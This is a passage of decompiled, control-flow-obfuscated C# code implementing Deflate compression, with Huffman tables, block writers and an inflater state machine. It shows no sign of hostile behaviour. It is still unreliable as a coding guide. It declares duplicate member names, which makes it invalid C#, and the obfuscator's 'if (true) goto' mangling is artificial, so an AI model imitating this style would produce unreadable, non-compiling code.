label_12:
                  if (num2 < 0)
                    return false;
                  input.\u0002(3);
                  this.\u0001[\u0004.\u0005.\u0003[this.\u0012]] = (byte) num2;
                  continue;
label_38:
                  num2 = num7;
                  goto label_12;
                }
                this.\u0001 = new \u0004.\u0004(this.\u0001);
                this.\u0001 = (byte[]) null;
                this.\u0012 = 0;
                this.\u0007 = 4;
                goto case 4;
              case 4:
                do
                {
                  int num8 = this.\u0001.\u0002(input);
                  if (true)
                    goto label_41;
label_22:
                  if ((num8 & -16) == 0)
                  {
                    byte[] numArray = this.\u0002;
                    \u0004.\u0005 obj = this;
                    int num9 = obj.\u0012;
                    if (true)
                      goto label_39;
label_18:
                    obj.\u0012 = num9 + 1;
                    int index = num1;
                    int num10 = (int) (byte) num3;
                    if (true)
                      goto label_40;
label_19:
                    this.\u0001 = (byte) num10;
                    int num11 = (int) num4;
                    numArray[index] = (byte) num11;
                    continue;
label_40:
                    num4 = (byte) num10;
                    goto label_19;
label_39:
                    num1 = num9;
                    goto label_18;
                  }
                  else
                    goto label_23;
label_41:
                  num3 = num8;
                  goto label_22;
                }
                while (this.\u0012 != this.\u0010);
                goto label_20;
label_23:
                if (num3 >= 0)
                {
                  if (num3 >= 17)
                    this.\u0001 = (byte) 0;
                  this.\u0011 = num3 - 16;
                  this.\u0007 = 5;
                  goto case 5;
                }
                else
                  goto label_24;
              case 5:
                int num12 = \u0004.\u0005.\u0002[this.\u0011];
                if (true)
                  goto label_42;
label_29:
                num5 = input.\u0002(n);
                if (num5 >= 0)
                {
                  input.\u0002(n);
                  num5 += \u0004.\u0005.\u0001[this.\u0011];
                  while (num5-- > 0)
                  {
                    byte[] numArray = this.\u0002;
                    num1 = this.\u0012++;
                    int index = num1;
                    int num13 = (int) this.\u0001;
                    numArray[index] = (byte) num13;
                  }
                  if (this.\u0012 != this.\u0010)
                  {
                    this.\u0007 = 4;
                    continue;
                  }
                  goto label_35;
                }
                else
                  goto label_30;
label_42:
                n = num12;
                goto label_29;
              default:
                continue;
            }
label_37:
            num1 = num6;
            goto label_1;
          }
label_3:
          return false;
label_6:
          return false;
label_9:
          return false;
label_20:
          return true;
label_24:
          return false;
label_30:
          return false;
label_35:
          return true;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) n;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num5;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<byte> o6 = (ValueType) num4;
          \u0004.\u0002 o8 = input;
          \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) this, (object) o8);
          throw;
        }
      }

      public \u0004.\u0004 \u0002()
      {
        byte[] numArray1;
        try
        {
          byte[] numArray2 = new byte[(int) checked ((uint) this.\u0008)];
          if (true)
            goto label_2;
label_1:
          Array.Copy((Array) this.\u0002, 0, (Array) numArray1, 0, this.\u0008);
          return new \u0004.\u0004(numArray1);
label_2:
          numArray1 = numArray2;
          goto label_1;
        }
        catch (Exception ex)
        {
          byte[] o1 = numArray1;
          \u0004.\u0002(ex, (object) o1, (object) this);
          throw;
        }
      }

      public \u0004.\u0004 \u0003()
      {
        byte[] numArray1;
        try
        {
          int num = this.\u000E;
          int length;
          while (true)
          {
            length = (int) checked ((uint) num);
            if (false)
              num = length;
            else
              break;
          }
          byte[] numArray2 = new byte[length];
          if (true)
            goto label_6;
label_3:
          if (true)
            Array.Copy((Array) this.\u0002, this.\u0008, (Array) numArray1, 0, this.\u000E);
          return new \u0004.\u0004(numArray1);
label_6:
          numArray1 = numArray2;
          goto label_3;
        }
        catch (Exception ex)
        {
          byte[] o1 = numArray1;
          \u0004.\u0002(ex, (object) o1, (object) this);
          throw;
        }
      }

      static \u0005()
      {
        try
        {
          int length = 3;
          if (length != 0)
          {
            int[] numArray = new int[length];
            // ISSUE: field reference
            RuntimeHelpers.InitializeArray((Array) numArray, __fieldref (\u0005.\u0001));
            \u0004.\u0005.\u0001 = numArray;
            do
            {
              \u0004.\u0005.\u0002 = new int[3]
              {
                2,
                3,
                7
              };
            }
            while (false);
            length = 19;
          }
          int[] numArray1 = new int[length];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray1, __fieldref (\u0005.\u0001));
          \u0004.\u0005.\u0003 = numArray1;
        }
        catch (Exception ex)
        {
          \u0004.\u0002(ex);
          throw;
        }
      }
    }

    internal sealed class \u0006
    {
      private const int \u0001 = 4;
      private const int \u0002 = 8;
      private const int \u0003 = 16;
      private const int \u0004 = 20;
      private const int \u0005 = 28;
      private const int \u0006 = 30;
      private int \u0007 = 16;
      private long \u0001 = 0;
      private \u0004.\u000E \u0001;
      private \u0004.\u0008 \u0001;

      public \u0006()
      {
        try
        {
          this.\u0001 = new \u0004.\u000E();
          this.\u0001 = new \u0004.\u0008(this.\u0001);
        }
        catch (Exception ex)
        {
          \u0004.\u0002(ex, (object) this);
          throw;
        }
      }

      public long TotalOut
      {
        get
        {
          try
          {
            return this.\u0001;
          }
          catch (Exception ex)
          {
            \u0004.\u0002(ex, (object) this);
            throw;
          }
        }
      }

      public void \u0002()
      {
        try
        {
          this.\u0007 |= 12;
        }
        catch (Exception ex)
        {
          \u0004.\u0002(ex, (object) this);
          throw;
        }
      }

      public bool IsFinished
      {
        get
        {
          try
          {
            return this.\u0007 == 30 && this.\u0001.IsFlushed;
          }
          catch (Exception ex)
          {
            \u0004.\u0002(ex, (object) this);
            throw;
          }
        }
      }

      public bool IsNeedingInput
      {
        get
        {
          try
          {
            return this.\u0001.\u0002();
          }
          catch (Exception ex)
          {
            \u0004.\u0002(ex, (object) this);
            throw;
          }
        }
      }

      public void \u0002(byte[] buffer)
      {
        try
        {
          this.\u0001.\u0002(buffer);
        }
        catch (Exception ex)
        {
          byte[] o2 = buffer;
          \u0004.\u0002(ex, (object) this, (object) o2);
          throw;
        }
      }

      public int \u0002(byte[] output)
      {
        int length1;
        int offset;
        int num1;
        int num2;
        int num3;
        try
        {
          if (true)
            goto label_25;
label_1:
          int length2 = output.Length;
          if (true)
            goto label_26;
label_2:
          int num4 = length1;
          if (true)
            goto label_27;
label_3:
          do
          {
            do
            {
              int num5 = this.\u0001.\u0002(output, offset, length1);
              if (true)
              {
                if (true)
                  goto label_28;
label_5:
                int num6 = offset + num1;
                if (true)
                  goto label_29;
label_6:
                this.\u0001 += (long) num1;
                int num7 = length1 - num1;
                if (true)
                  goto label_30;
label_7:
                if (length1 != 0 && this.\u0007 != 30)
                {
                  if (!this.\u0001.\u0003((this.\u0007 & 4) != 0, (this.\u0007 & 8) != 0))
                  {
                    num5 = this.\u0007;
                    goto label_10;
                  }
                  else
                    continue;
                }
                else
                  goto label_24;
label_30:
                length1 = num7;
                goto label_7;
label_29:
                offset = num6;
                goto label_6;
label_28:
                num1 = num5;
                goto label_5;
              }
label_10:
              if (num5 == 16)
                return num2 - length1;
              int num8 = this.\u0007;
              int num9 = 20;
              int num10;
              int num11;
              if (num9 != 0)
              {
                if (num8 == num9)
                {
                  int num12 = 8;
                  int num13 = -this.\u0001.BitCount;
                  if (true)
                  {
                    int num14 = num13 & 7;
                    num3 = num12 + num14;
                    goto label_18;
                  }
                  else
                  {
                    num11 = num13;
                    num10 = num12;
                    goto label_19;
                  }
                }
                else
                  continue;
              }
label_17:
              num3 = num8 - num9;
label_18:
              num10 = num3;
              num11 = 0;
label_19:
              if (false)
              {
                num9 = num11;
                num8 = num10;
                goto label_17;
              }
              else if (num10 > num11)
              {
                this.\u0001.\u0002(2, 10);
                int num15 = num3;
                num9 = 10;
                num8 = num15;
                goto label_17;
              }
              else
                this.\u0007 = 16;
            }
            while (this.\u0007 != 28);
            this.\u0001.\u0002();
            this.\u0007 = 30;
          }
          while (false);
          goto label_3;
label_24:
          return num2 - length1;
label_27:
          num2 = num4;
          goto label_3;
label_26:
          length1 = length2;
          goto label_2;
label_25:
          offset = 0;
          goto label_1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) offset;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) length1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) num3;
          byte[] o7 = output;
          \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) this, (object) o7);
          throw;
        }
      }
    }

    internal sealed class \u0007
    {
      private const int \u0001 = 16384;
      private const int \u0002 = 286;
      private const int \u0003 = 30;
      private const int \u0004 = 19;
      private const int \u0005 = 16;
      private const int \u0006 = 17;
      private const int \u0007 = 18;
      private const int \u0008 = 256;
      private static readonly int[] \u0001;
      private static readonly byte[] \u0001;
      private \u0004.\u000E \u0001;
      private \u0004.\u0007.\u0001 \u0001;
      private \u0004.\u0007.\u0001 \u0002;
      private \u0004.\u0007.\u0001 \u0003;
      private short[] \u0001;
      private byte[] \u0002;
      private int \u000E;
      private int \u000F;
      private static readonly short[] \u0002;
      private static readonly byte[] \u0003;
      private static readonly short[] \u0003;
      private static readonly byte[] \u0004;

      public static short \u0002(int toReverse)
      {
        try
        {
          return (short) ((int) \u0004.\u0007.\u0001[toReverse & 15] << 12 | (int) \u0004.\u0007.\u0001[toReverse >> 4 & 15] << 8 | (int) \u0004.\u0007.\u0001[toReverse >> 8 & 15] << 4 | (int) \u0004.\u0007.\u0001[toReverse >> 12]);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) toReverse;
          \u0004.\u0002(ex, (object) o1);
          throw;
        }
      }

      static \u0007()
      {
label_0:
        int index1;
        try
        {
          \u0004.\u0007.\u0001 = new int[19]
          {
            16,
            17,
            18,
            0,
            8,
            7,
            9,
            6,
            10,
            5,
            11,
            4,
            12,
            3,
            13,
            2,
            14,
            1,
            15
          };
          int length;
          if (true)
          {
            \u0004.\u0007.\u0001 = new byte[16]
            {
              (byte) 0,
              (byte) 8,
              (byte) 4,
              (byte) 12,
              (byte) 2,
              (byte) 10,
              (byte) 6,
              (byte) 14,
              (byte) 1,
              (byte) 9,
              (byte) 5,
              (byte) 13,
              (byte) 3,
              (byte) 11,
              (byte) 7,
              (byte) 15
            };
            \u0004.\u0007.\u0002 = new short[286];
            \u0004.\u0007.\u0003 = new byte[286];
            if (true)
            {
              if (true)
                goto label_24;
label_5:
              int num1;
              int num2;
              while (true)
              {
                num1 = index1;
                num2 = 144;
                if (num2 != 0)
                {
                  if (num1 < num2)
                  {
                    \u0004.\u0007.\u0002[index1] = \u0004.\u0007.\u0002(48 + index1 << 8);
                    byte[] numArray = \u0004.\u0007.\u0003;
                    int index2 = index1;
                    int num3 = index2 + 1;
                    if (true)
                      goto label_25;
label_4:
                    numArray[index2] = (byte) 8;
                    continue;
label_25:
                    index1 = num3;
                    goto label_4;
                  }
                  else
                    goto label_9;
                }
                else
                  break;
              }
              length = num2;
              length = num1;
              goto label_18;
label_24:
              index1 = 0;
              goto label_5;
            }
label_9:
            while (index1 < 256)
            {
              \u0004.\u0007.\u0002[index1] = \u0004.\u0007.\u0002(256 + index1 << 7);
              byte[] numArray = \u0004.\u0007.\u0003;
              int index3 = index1;
              int num = index3 + 1;
              if (true)
                goto label_26;
label_8:
              numArray[index3] = (byte) 9;
              continue;
label_26:
              index1 = num;
              goto label_8;
            }
            while (index1 < 280)
            {
              \u0004.\u0007.\u0002[index1] = \u0004.\u0007.\u0002(index1 - 256 << 9);
              if (true)
              {
                byte[] numArray = \u0004.\u0007.\u0003;
                int index4 = index1;
                int num = index4 + 1;
                if (true)
                  goto label_27;
label_12:
                numArray[index4] = (byte) 7;
                continue;
label_27:
                index1 = num;
                goto label_12;
              }
              else
                goto label_0;
            }
          }
          while (index1 < 286)
          {
            \u0004.\u0007.\u0002[index1] = \u0004.\u0007.\u0002(index1 - 88 << 8);
            byte[] numArray = \u0004.\u0007.\u0003;
            int index5 = index1;
            int num = index5 + 1;
            if (true)
              goto label_28;
label_15:
            numArray[index5] = (byte) 8;
            continue;
label_28:
            index1 = num;
            goto label_15;
          }
          length = 30;
label_18:
          if (length != 0)
          {
            \u0004.\u0007.\u0003 = new short[length];
            \u0004.\u0007.\u0004 = new byte[30];
            if (true)
              index1 = 0;
          }
          else
            goto label_22;
label_21:
          length = index1;
label_22:
          if (length >= 30)
            return;
          \u0004.\u0007.\u0003[index1] = \u0004.\u0007.\u0002(index1 << 11);
          \u0004.\u0007.\u0004[index1] = (byte) 5;
          ++index1;
          goto label_21;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) index1;
          \u0004.\u0002(ex, (object) o1);
          throw;
        }
      }

      public \u0007(\u0004.\u000E pending)
      {
        try
        {
          this.\u0001 = pending;
          this.\u0001 = new \u0004.\u0007.\u0001(this, 286, 257, 15);
          this.\u0002 = new \u0004.\u0007.\u0001(this, 30, 1, 15);
          this.\u0003 = new \u0004.\u0007.\u0001(this, 19, 4, 7);
          this.\u0001 = new short[16384];
          this.\u0002 = new byte[16384];
        }
        catch (Exception ex)
        {
          \u0004.\u000E o2 = pending;
          \u0004.\u0002(ex, (object) this, (object) o2);
          throw;
        }
      }

      public void \u0002()
      {
        try
        {
          this.\u000E = 0;
          this.\u000F = 0;
        }
        catch (Exception ex)
        {
          \u0004.\u0002(ex, (object) this);
          throw;
        }
      }

      private int \u0002(int len)
      {
        int num1;
        try
        {
          if (len == (int) byte.MaxValue)
            return 285;
          if (true)
            goto label_12;
label_7:
          int num2;
          while (true)
          {
            int num3;
            do
            {
              num3 = len;
              if (true)
              {
                if (num3 >= 8)
                  goto label_3;
              }
              else
                goto label_5;
            }
            while (false);
            break;
label_3:
            int num4 = num1 + 4;
            if (true)
              goto label_13;
label_4:
            num3 = len;
            goto label_5;
label_13:
            num1 = num4;
            goto label_4;
label_5:
            num2 = num3 >> 1;
            if (true)
              len = num2;
            else
              goto label_11;
          }
          num2 = num1;
label_11:
          int num5 = len;
          return num2 + num5;
label_12:
          num1 = 257;
          goto label_7;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) len;
          \u0004.\u0002(ex, (object) o1, (object) this, (object) o3);
          throw;
        }
      }

      private int \u0003(int distance)
      {
        int num1;
        try
        {
          do
          {
            if (true)
              goto label_10;
label_1:
            continue;
label_10:
            num1 = 0;
            goto label_1;
          }
          while (false);
          int num2;
          for (; distance >= 4; distance = num2)
          {
            int num3 = num1;
            int num4 = 3;
            if (num4 != 0)
            {
              if (num4 != 0)
              {
                int num5 = num3 + 2;
                if (true)
                  goto label_11;
label_5:
                int num6 = distance;
                num4 = 1;
                num3 = num6;
                goto label_6;
label_11:
                num1 = num5;
                goto label_5;
              }
              else
              {
                num2 = num3;
                continue;
              }
            }
label_6:
            num2 = num3 >> num4;
          }
          return num1 + distance;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) distance;
          \u0004.\u0002(ex, (object) o1, (object) this, (object) o3);
          throw;
        }
      }

      public void \u0002(int blTreeCodes)
      {
        int index;
        try
        {
          this.\u0003.\u0002();
          this.\u0001.\u0002();
          this.\u0002.\u0002();
          this.\u0001.\u0002(this.\u0001.\u0002 - 257, 5);
          this.\u0001.\u0002(this.\u0002.\u0002 - 1, 5);
          this.\u0001.\u0002(blTreeCodes - 4, 4);
          if (true)
            goto label_4;
label_2:
          while (index < blTreeCodes)
          {
            this.\u0001.\u0002((int) this.\u0003.\u0001[\u0004.\u0007.\u0001[index]], 3);
            int num = index + 1;
            if (true)
              index = num;
          }
          this.\u0001.\u0003(this.\u0003);
          this.\u0002.\u0003(this.\u0003);
          return;
label_4:
          index = 0;
          goto label_2;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) index;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) blTreeCodes;
          \u0004.\u0002(ex, (object) o1, (object) this, (object) o3);
          throw;
        }
      }

      public void \u0003()
      {
        int index;
        int distance;
        int num1;
        int code1;
        int count;
        int code2;
        try
        {
          int num2 = 0;
          if (num2 == 0)
          {
            if (true)
            {
              index = num2;
              goto label_22;
            }
            else
              goto label_22;
          }
          else
            goto label_16;
label_10:
          if (count <= 5)
            this.\u0001.\u0002(num1 & (1 << count) - 1, count);
label_12:
          int num3 = this.\u0003(distance);
label_13:
          code2 = num3;
          do
          {
            this.\u0002.\u0002(code2);
          }
          while (false);
          num2 = code2 / 2 - 1;
label_16:
          count = num2;
          num3 = count;
          if (true)
          {
            if (num3 > 0)
              this.\u0001.\u0002(distance & (1 << count) - 1, count);
          }
          else
            goto label_13;
label_20:
          if (true)
            ++index;
          else
            goto label_10;
label_22:
          if (index < this.\u000E)
          {
            int num4 = (int) this.\u0002[index] & (int) byte.MaxValue;
            if (true)
              goto label_25;
label_3:
            int num5 = (int) this.\u0001[index];
            if (true)
              goto label_26;
label_4:
            int num6 = distance;
            int num7 = num6 - 1;
            if (true)
              goto label_27;
label_5:
            int num8;
            for (; num6 != 0; num6 = num8)
            {
              int num9 = this.\u0002(num1);
              if (true)
                goto label_28;
label_7:
              this.\u0001.\u0002(code1);
              num8 = code1 - 261;
              if (false)
                continue;
              int num10 = num8 / 4;
              if (true)
                goto label_29;
label_9:
              if (count <= 0)
                goto label_12;
              else
                goto label_10;
label_29:
              count = num10;
              goto label_9;
label_28:
              code1 = num9;
              goto label_7;
            }
            this.\u0001.\u0002(num1);
            goto label_20;
label_27:
            distance = num7;
            goto label_5;
label_26:
            distance = num5;
            goto label_4;
label_25:
            num1 = num4;
            goto label_3;
          }
          else
            this.\u0001.\u0002(256);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) index;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) distance;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) code1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) count;
          // ISSUE: variable of a boxed type
          __Boxed<int> o6 = (ValueType) code2;
          \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) this);
          throw;
        }
      }

      public void \u0002(byte[] stored, int storedOffset, int storedLength, bool lastBlock)
      {
        try
        {
          this.\u0001.\u0002(lastBlock ? 1 : 0, 3);
          this.\u0001.\u0002();
          this.\u0001.\u0002(storedLength);
          this.\u0001.\u0002(~storedLength);
          this.\u0001.\u0002(stored, storedOffset, storedLength);
          this.\u0002();
        }
        catch (Exception ex)
        {
          byte[] o2 = stored;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) storedOffset;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) storedLength;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o5 = (ValueType) lastBlock;
          \u0004.\u0002(ex, (object) this, (object) o2, (object) o3, (object) o4, (object) o5);
          throw;
        }
      }

      public void \u0003(byte[] stored, int storedOffset, int storedLength, bool lastBlock)
      {
        short[] numArray1;
        int index1;
        int blTreeCodes;
        int num1;
        int index2;
        int index3;
        int num2;
        try
        {
          short[] numArray2 = this.\u0001.\u0001;
          if (true)
            goto label_28;
label_1:
          numArray2[256] = (short) ((int) numArray1[256] + 1);
          if (true)
          {
            this.\u0001.\u0003();
            this.\u0002.\u0003();
            this.\u0001.\u0002(this.\u0003);
            this.\u0002.\u0002(this.\u0003);
            this.\u0003.\u0003();
            if (true)
              goto label_29;
label_3:
            if (false)
              return;
            if (true)
            {
              index1 = 18;
              goto label_11;
            }
            else
              goto label_11;
label_29:
            blTreeCodes = 4;
            goto label_3;
          }
label_11:
          while (true)
          {
            int num3;
            do
            {
              int num4;
              int num5;
              if (index1 > blTreeCodes)
              {
                num4 = (int) this.\u0003.\u0001[\u0004.\u0007.\u0001[index1]];
                num5 = 0;
              }
              else
                goto label_12;
label_6:
              if (num4 > num5)
              {
                if (true)
                {
                  int num6 = index1 + 1;
                  if (true)
                    blTreeCodes = num6;
                }
                else
                  goto label_36;
              }
              int num7 = index1;
              if (true)
              {
                num3 = num7 - 1;
                continue;
              }
              goto label_13;
label_12:
              num7 = 14 + blTreeCodes * 3 + this.\u0003.\u0002();
label_13:
              int num8 = this.\u0001.\u0002();
              int num9 = num7 + num8 + this.\u0002.\u0002() + this.\u000F;
              if (true)
                goto label_33;
label_14:
              num1 = this.\u000F;
              for (index2 = 0; index2 < 286; ++index2)
                num1 += (int) this.\u0001.\u0001[index2] * (int) \u0004.\u0007.\u0003[index2];
              for (index3 = 0; index3 < 30; ++index3)
              {
                int num10 = num1;
                int num11 = (int) this.\u0002.\u0001[index3] * (int) \u0004.\u0007.\u0004[index3];
                if (false)
                {
                  num5 = num11;
                  num4 = num10;
                  goto label_6;
                }
                else
                  num1 = num10 + num11;
              }
              goto label_21;
label_33:
              num2 = num9;
              goto label_14;
            }
            while (false);
            index1 = num3;
          }
label_36:
          return;
label_21:
          if (num2 >= num1)
            num2 = num1;
          if (storedOffset >= 0 && storedLength + 4 < num2 >> 3)
          {
            this.\u0002(stored, storedOffset, storedLength, lastBlock);
            return;
          }
          if (num2 == num1)
          {
            this.\u0001.\u0002(2 + (lastBlock ? 1 : 0), 3);
            this.\u0001.\u0002(\u0004.\u0007.\u0002, \u0004.\u0007.\u0003);
            this.\u0002.\u0002(\u0004.\u0007.\u0003, \u0004.\u0007.\u0004);
            this.\u0003();
            this.\u0002();
            return;
          }
          this.\u0001.\u0002(4 + (lastBlock ? 1 : 0), 3);
          this.\u0002(blTreeCodes);
          this.\u0003();
          this.\u0002();
          return;
label_28:
          numArray1 = numArray2;
          goto label_1;
        }
        catch (Exception ex)
        {
          object[] objects = new object[12]
          {
            (object) blTreeCodes,
            (object) index1,
            (object) num2,
            (object) num1,
            (object) index2,
            (object) index3,
            (object) numArray1,
            (object) this,
            (object) stored,
            (object) storedOffset,
            (object) storedLength,
            (object) lastBlock
          };
          \u0004.\u0002(ex, objects);
          throw;
        }
      }

      public bool \u0002()
      {
        try
        {
          return this.\u000E >= 16384;
        }
        catch (Exception ex)
        {
          \u0004.\u0002(ex, (object) this);
          throw;
        }
      }

      public bool \u0002(int lit)
      {
        int num1;
        short[] numArray1;
        int index1;
        try
        {
          this.\u0001[this.\u000E] = (short) 0;
          byte[] numArray2 = this.\u0002;
          \u0004.\u0007 obj = this;
          int num2 = obj.\u000E;
          if (true)
            goto label_4;
label_1:
          obj.\u000E = num2 + 1;
          int index2 = num1;
          int num3 = (int) (byte) lit;
          numArray2[index2] = (byte) num3;
          short[] numArray3 = this.\u0001.\u0001;
          if (true)
            goto label_5;
label_2:
          int index3 = lit;
          if (true)
            goto label_6;
label_3:
          numArray3[index3] = (short) ((int) numArray1[(IntPtr) index1] + 1);
          return this.\u0002();
label_6:
          index1 = index3;
          goto label_3;
label_5:
          numArray1 = numArray3;
          goto label_2;
label_4:
          num1 = num2;
          goto label_1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          short[] o2 = numArray1;
          // ISSUE: variable of a boxed type
          __Boxed<IntPtr> o3 = (ValueType) (IntPtr) index1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) lit;
          \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, (object) this, (object) o5);
          throw;
        }
      }

      public bool \u0002(int dist, int len)
      {
        int num1;
        int num2;
        short[] numArray1;
        IntPtr index1;
        int num3;
        try
        {
          this.\u0001[this.\u000E] = (short) dist;
          byte[] numArray2 = this.\u0002;
          \u0004.\u0007 obj = this;
          int num4 = obj.\u000E;
          if (true)
            goto label_11;
label_1:
          obj.\u000E = num4 + 1;
          int index2 = num1;
          int num5 = (int) (byte) (len - 3);
          numArray2[index2] = (byte) num5;
          int num6 = this.\u0002(len - 3);
          if (true)
            goto label_12;
label_2:
          short[] numArray3 = this.\u0001.\u0001;
          if (true)
            goto label_13;
label_3:
          int index3 = num2;
          if (true)
            goto label_14;
label_4:
          numArray3[index3] = (short) ((int) numArray1[index1] + 1);
          if (num2 >= 265 && num2 < 285)
            this.\u000F += (num2 - 261) / 4;
          int num7 = this.\u0003(dist - 1);
          if (true)
            goto label_15;
label_7:
          short[] numArray4 = this.\u0002.\u0001;
          if (true)
            goto label_16;
label_8:
          int index4;
          index1 = (IntPtr) (index4 = num3);
          int num8 = (int) (short) ((int) numArray1[index1] + 1);
          numArray4[index4] = (short) num8;
          if (num3 >= 4)
            this.\u000F += num3 / 2 - 1;
          return this.\u0002();
label_16:
          numArray1 = numArray4;
          goto label_8;
label_15:
          num3 = num7;
          goto label_7;
label_14:
          index1 = (IntPtr) index3;
          goto label_4;
label_13:
          numArray1 = numArray3;
          goto label_3;
label_12:
          num2 = num6;
          goto label_2;
label_11:
          num1 = num4;
          goto label_1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num1;
          short[] o4 = numArray1;
          // ISSUE: variable of a boxed type
          __Boxed<IntPtr> o5 = (ValueType) index1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o7 = (ValueType) dist;
          // ISSUE: variable of a boxed type
          __Boxed<int> o8 = (ValueType) len;
          \u0004.\u0002(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) this, (object) o7, (object) o8);
          throw;
        }
      }

      public sealed class \u0001
      {
        public short[] \u0001;
        public byte[] \u0001;
        public int \u0001;
        public int \u0002;
        private short[] \u0002;
        private int[] \u0001;
        private int \u0003;
        private \u0004.\u0007 \u0001;

        public \u0001(\u0004.\u0007 dh, int elems, int minCodes, int maxLength)
        {
          try
          {
            this.\u0001 = dh;
            this.\u0001 = minCodes;
            this.\u0003 = maxLength;
            this.\u0001 = new short[(int) checked ((uint) elems)];
            this.\u0001 = new int[(int) checked ((uint) maxLength)];
          }
          catch (Exception ex)
          {
            \u0004.\u0007 o2 = dh;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) elems;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) minCodes;
            // ISSUE: variable of a boxed type
            __Boxed<int> o5 = (ValueType) maxLength;
            \u0004.\u0002(ex, (object) this, (object) o2, (object) o3, (object) o4, (object) o5);
            throw;
          }
        }

        public void \u0002(int code)
        {
          try
          {
            this.\u0001.\u0001.\u0002((int) this.\u0002[code] & (int) ushort.MaxValue, (int) this.\u0001[code]);
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) code;
            \u0004.\u0002(ex, (object) this, (object) o2);
            throw;
          }
        }

        public void \u0002(short[] stCodes, byte[] stLength)
        {
          try
          {
            this.\u0002 = stCodes;
            this.\u0001 = stLength;
          }
          catch (Exception ex)
          {
            short[] o2 = stCodes;
            byte[] o3 = stLength;
            \u0004.\u0002(ex, (object) this, (object) o2, (object) o3);
            throw;
          }
        }

        public void \u0002()
        {
          int[] numArray1;
          int index1;
          int num1;
          int index2;
          int num2;
          int[] numArray2;
          IntPtr index3;
          try
          {
            int length = this.\u0001.Length;
label_1:
            int[] numArray3 = new int[(int) checked ((uint) this.\u0003)];
            if (true)
              goto label_20;
label_2:
            if (true)
              goto label_21;
label_3:
            this.\u0002 = new short[(int) checked ((uint) this.\u0001.Length)];
            if (true)
            {
              if (true)
              {
                index1 = 0;
                goto label_8;
              }
              else
                goto label_8;
            }
            else
              goto label_15;
label_7:
            int num3;
            if (true)
              index1 = num3;
label_8:
            int num4 = index1;
            int num5 = this.\u0003;
            if (true)
            {
              if (num4 < num5)
              {
                numArray1[index1] = num1;
                int num6 = num1 + (this.\u0001[index1] << 15 - index1);
                if (true)
                  goto label_23;
label_6:
                num3 = index1 + 1;
                goto label_7;
label_23:
                num1 = num6;
                goto label_6;
              }
              else if (true)
              {
                index2 = 0;
                goto label_18;
              }
              else
                goto label_18;
            }
label_12:
            if (num4 > num5)
            {
              if (true)
                this.\u0002[index2] = \u0004.\u0007.\u0002(numArray1[num2 - 1]);
              else
                goto label_1;
            }
            else
              goto label_16;
label_15:
            (numArray2 = numArray1)[(int) (index3 = (IntPtr) (num2 - 1))] = numArray2[index3] + (1 << 16 - num2);
label_16:
            num3 = index2;
            if (true)
              index2 = num3 + 1;
            else
              goto label_7;
label_18:
            if (index2 >= this.\u0002)
              return;
            num2 = (int) this.\u0001[index2];
            int num7 = num2;
            num5 = 0;
            num4 = num7;
            goto label_12;
label_21:
            num1 = 0;
            goto label_3;
label_20:
            numArray1 = numArray3;
            goto label_2;
          }
          catch (Exception ex)
          {
            int[] o1 = numArray1;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) num1;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) index1;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) index2;
